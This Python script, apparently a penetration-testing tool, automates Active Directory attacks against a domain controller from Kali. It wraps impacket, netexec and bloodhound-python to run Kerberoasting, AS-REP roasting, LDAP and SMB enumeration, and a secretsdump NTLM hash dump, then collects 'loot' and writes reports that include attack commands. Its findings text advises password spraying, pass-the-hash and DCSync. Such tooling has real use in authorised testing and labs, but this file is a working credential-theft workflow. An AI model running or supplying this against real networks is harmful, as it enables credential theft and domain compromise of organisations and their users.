"""
kali_main.py - Run AD enumeration remotely from Kali/Linux.
Uses impacket, bloodhound-python, and netexec — no access to Windows machine needed.

Usage:
    python3 kali_main.py
"""

import os
import sys
import subprocess
import socket
import getpass
import re
from datetime import datetime

sys.path.insert(0, os.path.dirname(__file__))
from core.report import generate_all

# ---------------------------------------------------------------------------
# Colors
# ---------------------------------------------------------------------------
class C:
    RED    = "\033[91m"
    YELLOW = "\033[93m"
    GREEN  = "\033[92m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"
    DIM    = "\033[2m"
    MAGENTA= "\033[95m"

def _ok(m):   print(f"  {C.GREEN}[+]{C.RESET} {m}")
def _info(m): print(f"  {C.CYAN}[*]{C.RESET} {m}")
def _warn(m): print(f"  {C.YELLOW}[!]{C.RESET} {m}")
def _err(m):  print(f"  {C.RED}[-]{C.RESET} {m}")
def _section(t):
    print(f"\n{C.BOLD}{C.MAGENTA}{'─' * 60}{C.RESET}")
    print(f"{C.BOLD}{C.MAGENTA}  {t}{C.RESET}")
    print(f"{C.BOLD}{C.MAGENTA}{'─' * 60}{C.RESET}\n")

BANNER = r"""
  _  __     _ _   __  __       _
 | |/ /    | (_) |  \/  |     (_)
 | ' / __ _| |_  | \  / | __ _ _ _ __
 |  < / _` | | | | |\/| |/ _` | | '_ \
 | . \ (_| | | | | |  | | (_| | | | | |
 |_|\_\__,_|_|_| |_|  |_|\__,_|_|_| |_|

     Remote AD Recon from Kali - powered by impacket
     For educational use only.
"""

# ---------------------------------------------------------------------------
# Dependency check
# ---------------------------------------------------------------------------
REQUIRED_TOOLS = {
    "bloodhound-python": "pip3 install bloodhound",
    "impacket-GetUserSPNs": "pip3 install impacket",
    "impacket-GetNPUsers": "pip3 install impacket",
    "impacket-secretsdump": "pip3 install impacket",
    "netexec": "sudo apt install netexec",
    "ldapsearch": "sudo apt install ldap-utils",
}

def check_deps():
    missing = []
    for tool, install in REQUIRED_TOOLS.items():
        result = subprocess.run(["which", tool], capture_output=True)
        if result.returncode != 0:
            missing.append((tool, install))
    if missing:
        _warn("Missing tools — install them first:")
        for tool, cmd in missing:
            print(f"    {C.RED}[x]{C.RESET} {tool:<30} {C.DIM}{cmd}{C.RESET}")
        print()
    return len(missing) == 0

# ---------------------------------------------------------------------------
# Wizard
# ---------------------------------------------------------------------------
def wizard():
    _section("Setup")

    dc_ip  = input(f"  {C.CYAN}>{C.RESET} DC IP [{C.DIM}192.168.50.10{C.RESET}]: ").strip() or "192.168.50.10"
    domain = input(f"  {C.CYAN}>{C.RESET} Domain (e.g. force.local): ").strip()
    user   = input(f"  {C.CYAN}>{C.RESET} Username (e.g. aniken.s): ").strip()

    print(f"\n  Auth type:")
    print(f"    {C.GREEN}[1]{C.RESET} Password")
    print(f"    {C.GREEN}[2]{C.RESET} NTLM hash")
    choice = input(f"  {C.CYAN}>{C.RESET} Choice [1]: ").strip() or "1"

    password = ""
    ntlm     = ""
    if choice == "2":
        ntlm = input(f"  {C.CYAN}>{C.RESET} NTLM hash (LM:NT or just NT): ").strip()
        if ":" not in ntlm:
            ntlm = f"aad3b435b51404eeaad3b435b51404ee:{ntlm}"
    else:
        password = getpass.getpass(f"  {C.CYAN}>{C.RESET} Password: ")

    out_dir = input(f"  {C.CYAN}>{C.RESET} Output directory [{C.DIM}./results{C.RESET}]: ").strip() or "./results"
    os.makedirs(out_dir, exist_ok=True)
    os.makedirs(os.path.join(out_dir, "raw"), exist_ok=True)

    return {
        "dc_ip":    dc_ip,
        "domain":   domain,
        "user":     user,
        "password": password,
        "ntlm":     ntlm,
        "out_dir":  out_dir,
        "raw_dir":  os.path.join(out_dir, "raw"),
    }

# ---------------------------------------------------------------------------
# Runner helpers
# ---------------------------------------------------------------------------
def _run(cmd, out_file, timeout=300):
    _info(f"Running: {' '.join(cmd)}")
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True,
            timeout=timeout, errors="ignore"
        )
        output = result.stdout + result.stderr
        with open(out_file, "w") as f:
            f.write(output)
        _ok(f"Done -> {out_file}")
        return output
    except subprocess.TimeoutExpired:
        _warn(f"Timed out after {timeout}s")
        return ""
    except Exception as e:
        _err(f"Failed: {e}")
        return ""

def _auth_args(cfg):
    """Build impacket-style auth args."""
    if cfg["ntlm"]:
        return [f"{cfg['domain']}/{cfg['user']}", "-hashes", cfg["ntlm"]]
    return [f"{cfg['domain']}/{cfg['user']}:{cfg['password']}"]

# ---------------------------------------------------------------------------
# Individual tool runners
# ---------------------------------------------------------------------------
def run_bloodhound(cfg):
    _info("Running bloodhound-python (full collection)...")
    log_file = os.path.join(cfg["raw_dir"], "bloodhound.log")

    # bloodhound-python drops the ZIP in cwd — run it from raw_dir
    cmd = [
        "bloodhound-python",
        "-d", cfg["domain"],
        "-u", cfg["user"],
        "-ns", cfg["dc_ip"],
        "-dc", cfg["dc_ip"],
        "-c", "All",
        "--zip",
        "--dns-tcp",
    ]
    if cfg["ntlm"]:
        cmd += ["--hashes", cfg["ntlm"]]
    else:
        cmd += ["-p", cfg["password"]]

    _info(f"Running: {' '.join(cmd)}")
    try:
        result = subprocess.run(
            cmd,
            capture_output=True, text=True,
            timeout=300, errors="ignore",
            cwd=cfg["raw_dir"]   # ZIP drops here
        )
        output = result.stdout + result.stderr
        with open(log_file, "w") as f:
            f.write(output)

        # Find the ZIP
        zips = [f for f in os.listdir(cfg["raw_dir"]) if f.endswith(".zip")]
        if zips:
            _ok(f"BloodHound ZIP -> {os.path.join(cfg['raw_dir'], zips[0])}")
        else:
            _warn("BloodHound ZIP not found — check bloodhound.log for errors")
            if output:
                for line in output.splitlines()[-10:]:
                    print(f"    {C.DIM}{line}{C.RESET}")
        return output
    except subprocess.TimeoutExpired:
        _warn("bloodhound-python timed out")
        return ""
    except Exception as e:
        _err(f"bloodhound-python failed: {e}")
        return ""


def run_kerberoast(cfg):
    out_file = os.path.join(cfg["raw_dir"], "kerberoast.txt")
    cmd = ["impacket-GetUserSPNs"] + _auth_args(cfg) + [
        "-dc-ip", cfg["dc_ip"],
        "-request", "-outputfile", os.path.join(cfg["raw_dir"], "kerberoast_hashes.txt")
    ]
    return _run(cmd, out_file)


def run_asrep(cfg):
    out_file = os.path.join(cfg["raw_dir"], "asrep.txt")
    # First get user list via ldapsearch
    users_file = os.path.join(cfg["raw_dir"], "users.txt")
    _get_users_ldap(cfg, users_file)
    cmd = ["impacket-GetNPUsers",
           f"{cfg['domain']}/",
           "-usersfile", users_file,
           "-dc-ip", cfg["dc_ip"],
           "-format", "hashcat",
           "-outputfile", os.path.join(cfg["raw_dir"], "asrep_hashes.txt")]
    return _run(cmd, out_file)


def _get_users_ldap(cfg, out_file):
    """Dump user list via netexec for AS-REP roasting."""
    try:
        if cfg["ntlm"]:
            auth = ["-u", cfg["user"], "-H", cfg["ntlm"].split(":")[-1]]
        else:
            auth = ["-u", cfg["user"], "-p", cfg["password"]]

        result = subprocess.run(
            ["netexec", "ldap", cfg["dc_ip"]] + auth + ["--users"],
            capture_output=True, text=True, timeout=30, errors="ignore"
        )
        # netexec --users output: lines like "LDAP  ... username  ..."
        users = re.findall(r"\bLDAP\b.+?\s{2,}(\S+)\s{2,}", result.stdout)
        if not users:
            # fallback: grab any word after green/yellow status marker
            users = re.findall(r"\[\*\]\s+(\S+@\S+|\S+\\\S+|\S+)", result.stdout)
        with open(out_file, "w") as f:
            f.write("\n".join(set(users)))
        _ok(f"Got {len(set(users))} users for AS-REP check")
    except Exception as e:
        _warn(f"Could not get user list: {e}")


def run_ldap_enum(cfg):
    """
    Full LDAP enumeration using:
    1. impacket-ldapdomaindump  — structured dump of all AD objects
    2. netexec ldap             — targeted queries (kerberoastable, asrep, etc.)
    """
    out_file = os.path.join(cfg["raw_dir"], "ldap_enum.txt")
    dump_dir = os.path.join(cfg["raw_dir"], "ldapdomaindump")
    os.makedirs(dump_dir, exist_ok=True)

    output = ""

    # ── impacket-ldapdomaindump ───────────────────────────────────────────
    _info("Running ldapdomaindump...")
    if cfg["ntlm"]:
        ldd_auth = ["-u", f"{cfg['domain']}\\{cfg['user']}", "--hashes", cfg["ntlm"]]
    else:
        ldd_auth = ["-u", f"{cfg['domain']}\\{cfg['user']}", "-p", cfg["password"]]

    ldd_cmd = ["impacket-ldapdomaindump"] + ldd_auth + [
        cfg["dc_ip"],
        "-o", dump_dir,
        "--no-html",   # save as .json + .grep (text)
    ]
    try:
        result = subprocess.run(ldd_cmd, capture_output=True, text=True, timeout=120, errors="ignore")
        ldd_out = result.stdout + result.stderr
        output += f"=== LDAPDOMAINDUMP ===\n{ldd_out}\n"

        # Parse the .grep files into our section format
        grep_map = {
            "domain_users.grep":       "DOMAIN USERS",
            "domain_groups.grep":      "DOMAIN GROUPS",
            "domain_computers.grep":   "DOMAIN COMPUTERS",
            "domain_policy.grep":      "PASSWORD POLICY",
            "domain_trusts.grep":      "DOMAIN TRUSTS",
            "domain_controllers.grep": "DOMAIN CONTROLLERS",
        }
        for fname, section_name in grep_map.items():
            fpath = os.path.join(dump_dir, fname)
            if os.path.exists(fpath):
                with open(fpath) as f:
                    content = f.read()
                output += f"\n=== {section_name} ===\n{content}\n"
                _ok(f"Parsed {fname}")
    except Exception as e:
        _warn(f"ldapdomaindump error: {e}")

    # ── netexec ldap targeted queries ────────────────────────────────────
    _info("Running netexec ldap targeted queries...")

    if cfg["ntlm"]:
        nxc_auth = ["-u", cfg["user"], "-H", cfg["ntlm"].split(":")[-1]]
    else:
        nxc_auth = ["-u", cfg["user"], "-p", cfg["password"]]

    nxc_base = ["netexec", "ldap", cfg["dc_ip"]] + nxc_auth

    nxc_queries = {
        "KERBEROASTABLE USERS": ["--kerberoasting", os.path.join(cfg["raw_dir"], "kerberoast_hashes.txt")],
        "ASREP ROASTABLE USERS": ["--asreproast", os.path.join(cfg["raw_dir"], "asrep_hashes.txt")],
        "DOMAIN ADMINS":        ["--groups"],
        "PASSWORD POLICY":      ["--pass-pol"],
        "UNCONSTRAINED DELEGATION": ["--trusted-for-delegation"],
        "ADMIN USERS":          ["--admin-count"],
    }

    for section_name, flags in nxc_queries.items():
        try:
            result = subprocess.run(
                nxc_base + flags,
                capture_output=True, text=True, timeout=30, errors="ignore"
            )
            section_out = result.stdout + result.stderr
            output += f"\n=== {section_name} ===\n{section_out}\n"
            if result.stdout.strip():
                _ok(f"{section_name} done")
        except Exception as e:
            _warn(f"netexec {section_name} failed: {e}")

    with open(out_file, "w") as f:
        f.write(output)
    _ok(f"LDAP enum complete -> {out_file}")
    return output


def run_shares(cfg):
    out_file = os.path.join(cfg["raw_dir"], "shares.txt")
    if cfg["ntlm"]:
        cmd = ["netexec", "smb", cfg["dc_ip"],
               "-u", cfg["user"], "-H", cfg["ntlm"].split(":")[-1], "--shares"]
    else:
        cmd = ["netexec", "smb", cfg["dc_ip"],
               "-u", cfg["user"], "-p", cfg["password"], "--shares"]
    return _run(cmd, out_file, timeout=60)


def run_passpol(cfg):
    out_file = os.path.join(cfg["raw_dir"], "passpol.txt")
    if cfg["ntlm"]:
        cmd = ["netexec", "smb", cfg["dc_ip"],
               "-u", cfg["user"], "-H", cfg["ntlm"].split(":")[-1], "--pass-pol"]
    else:
        cmd = ["netexec", "smb", cfg["dc_ip"],
               "-u", cfg["user"], "-p", cfg["password"], "--pass-pol"]
    return _run(cmd, out_file, timeout=60)


def run_secretsdump(cfg):
    """Only runs if user is admin."""
    out_file = os.path.join(cfg["raw_dir"], "secretsdump.txt")
    cmd = ["impacket-secretsdump"] + _auth_args(cfg) + [
        f"@{cfg['dc_ip']}", "-just-dc-ntlm"
    ]
    return _run(cmd, out_file, timeout=120)


def _domain_to_dn(domain):
    return ",".join(f"DC={p}" for p in domain.split("."))

# ---------------------------------------------------------------------------
# Parser — extract findings from impacket/ldap output
# ---------------------------------------------------------------------------
def parse_results(raw):
    from core.parser import Finding, SEVERITY_ORDER
    findings = []

    ldap = raw.get("ldap_enum", "")
    kerb = raw.get("kerberoast", "")
    asrep = raw.get("asrep", "")
    shares = raw.get("shares", "")
    passpol = raw.get("passpol", "")
    secrets = raw.get("secretsdump", "")

    def section(text, header):
        m = re.search(rf"===\s*{re.escape(header)}\s*===\s*\n(.*?)(?====|\Z)", text, re.DOTALL | re.IGNORECASE)
        return m.group(1).strip() if m else ""

    # Kerberoastable
    kerb_users = re.findall(r"ServicePrincipalName.*?\n.*?(\S+@\S+)", kerb, re.IGNORECASE)
    spn_users  = re.findall(r"sAMAccountName:\s*(.+)", section(ldap, "KERBEROASTABLE USERS"))
    all_kerb   = list(set(kerb_users + spn_users))
    if all_kerb:
        findings.append(Finding("kerberoastable_users", f"Kerberoastable Accounts ({len(all_kerb)} found)",
            "HIGH", "Kerberos", "Accounts with SPNs — request TGS tickets and crack offline.", all_kerb, "impacket"))

    # AS-REP roastable
    asrep_users = re.findall(r"sAMAccountName:\s*(.+)", section(ldap, "ASREP ROASTABLE USERS"))
    asrep_hashes = re.findall(r"\$krb5asrep\$[^\s]+", asrep)
    if asrep_users:
        findings.append(Finding("asrep_roastable", f"AS-REP Roastable Accounts ({len(asrep_users)} found)",
            "HIGH", "Kerberos", "Pre-auth disabled — hash requestable without credentials.", asrep_users, "impacket"))

    # Unconstrained delegation
    unc_hosts = re.findall(r"sAMAccountName:\s*(.+)", section(ldap, "UNCONSTRAINED DELEGATION"))
    unc_hosts  = [h for h in unc_hosts if "DC" not in h.upper()]
    if unc_hosts:
        findings.append(Finding("unconstrained_delegation", "Unconstrained Delegation (Non-DC)",
            "CRITICAL", "Delegation", "Coerce DC auth to these hosts -> capture TGT -> DCSync.", unc_hosts, "ldapsearch"))

    # Constrained delegation
    const_hosts = re.findall(r"sAMAccountName:\s*(.+)", section(ldap, "CONSTRAINED DELEGATION"))
    if const_hosts:
        findings.append(Finding("constrained_delegation", f"Constrained Delegation ({len(const_hosts)} found)",
            "HIGH", "Delegation", "S4U2Proxy abuse possible if account is compromised.", const_hosts, "ldapsearch"))

    # Password policy — no lockout
    if re.search(r"lockoutThreshold:\s*0", passpol + ldap, re.IGNORECASE):
        findings.append(Finding("no_lockout", "No Account Lockout Policy",
            "HIGH", "PasswordPolicy", "Lockout threshold is 0 — spray passwords freely.", ["lockoutThreshold: 0"], "netexec"))

    # Hashes from secretsdump
    hashes = re.findall(r"\w+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}", secrets)
    if hashes:
        findings.append(Finding("hashes_found", f"NTLM Hashes Dumped ({len(hashes)} accounts)",
            "CRITICAL", "CredentialAccess", "Full NTLM hash dump from DC — crack or pass-the-hash.", hashes[:20], "secretsdump"))

    # SMB shares
    interesting = re.findall(r"(SYSVOL|NETLOGON|[A-Z]\$|[a-z]+\$)[^\n]*READ", shares, re.IGNORECASE)
    if interesting:
        findings.append(Finding("smb_shares", f"Readable SMB Shares ({len(interesting)} found)",
            "MEDIUM", "Enumeration", "Readable shares found — check for sensitive files, scripts, passwords.", interesting, "netexec"))

    findings.sort(key=lambda f: {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}.get(f.severity, 9))
    return findings


# ---------------------------------------------------------------------------
# Loot collector
# ---------------------------------------------------------------------------
def collect_loot_kali(raw, cfg):
    ldap = raw.get("ldap_enum", "")
    secrets = raw.get("secretsdump", "")

    def section(text, header):
        m = re.search(rf"===\s*{re.escape(header)}\s*===\s*\n(.*?)(?====|\Z)", text, re.DOTALL | re.IGNORECASE)
        return m.group(1).strip() if m else ""

    def ldap_attr(text, attr):
        return list(dict.fromkeys(re.findall(rf"{attr}:\s*(.+)", text)))

    loot = {
        "domain_users":        ldap_attr(section(ldap, "DOMAIN USERS"), "sAMAccountName"),
        "domain_admins":       ldap_attr(section(ldap, "DOMAIN ADMINS"), "sAMAccountName"),
        "domain_computers":    ldap_attr(section(ldap, "DOMAIN COMPUTERS"), "sAMAccountName"),
        "domain_controllers":  ldap_attr(section(ldap, "DOMAIN CONTROLLERS"), "sAMAccountName"),
        "kerberoastable":      ldap_attr(section(ldap, "KERBEROASTABLE USERS"), "sAMAccountName"),
        "asrep_roastable":     ldap_attr(section(ldap, "ASREP ROASTABLE USERS"), "sAMAccountName"),
        "spns":                ldap_attr(section(ldap, "KERBEROASTABLE USERS"), "servicePrincipalName"),
        "hashes_found":        re.findall(r"\w+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}", secrets)[:20],
        "passwords_found":     [],
        "password_policy":     ldap_attr(section(ldap, "PASSWORD POLICY"),
                                         "minPwdLength|lockoutThreshold|pwdHistoryLength|maxPwdAge"),
        "domain_trusts":       [],
        "gpos":                ldap_attr(section(ldap, "GPO LIST"), "displayName"),
        "interesting_files":   [],
    }
    return loot


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    print(C.RED + BANNER + C.RESET)

    _section("Dependency Check")
    if not check_deps():
        _warn("Some tools missing — continuing anyway, affected steps will be skipped.")

    cfg = wizard()

    _section("PHASE 2 - Remote Enumeration")

    raw = {}

    _info("Starting LDAP enumeration...")
    out = run_ldap_enum(cfg)
    if out: raw["ldap_enum"] = out

    _info("Starting Kerberoasting...")
    out = run_kerberoast(cfg)
    if out: raw["kerberoast"] = out

    _info("Starting AS-REP Roasting...")
    out = run_asrep(cfg)
    if out: raw["asrep"] = out

    _info("Enumerating SMB shares...")
    out = run_shares(cfg)
    if out: raw["shares"] = out

    _info("Checking password policy...")
    out = run_passpol(cfg)
    if out: raw["passpol"] = out

    _info("Running BloodHound collection...")
    out = run_bloodhound(cfg)
    if out: raw["bloodhound"] = out

    print()
    _warn("Attempting secretsdump (will fail silently if not admin)...")
    out = run_secretsdump(cfg)
    if out: raw["secretsdump"] = out

    _section("PHASE 3 - Report Generation")

    findings = parse_results(raw)
    _ok(f"Parsed {len(findings)} finding(s).")

    loot = collect_loot_kali(raw, cfg)

    config = {
        "target": {"domain": cfg["domain"], "dc_ip": cfg["dc_ip"]},
        "auth":   {"username": cfg["user"], "password": cfg["password"]},
        "scope":  {"output_dir": cfg["out_dir"]},
        "discovery": {
            "internet": True,
            "network": {"local_ip": "", "hostname": ""},
            "user": {"username": cfg["user"]},
        }
    }

    r1, r2, md = generate_all(findings, config, raw_outputs=raw)

    _section("Done")
    _ok(f"Report 1 (Findings):        {r1}")
    _ok(f"Report 2 (Attack Commands): {r2}")
    _ok(f"Combined Markdown:          {md}")
    print(f"\n  {C.DIM}BloodHound ZIP (if collected): {cfg['raw_dir']}/*.zip{C.RESET}\n")


if __name__ == "__main__":
    main()
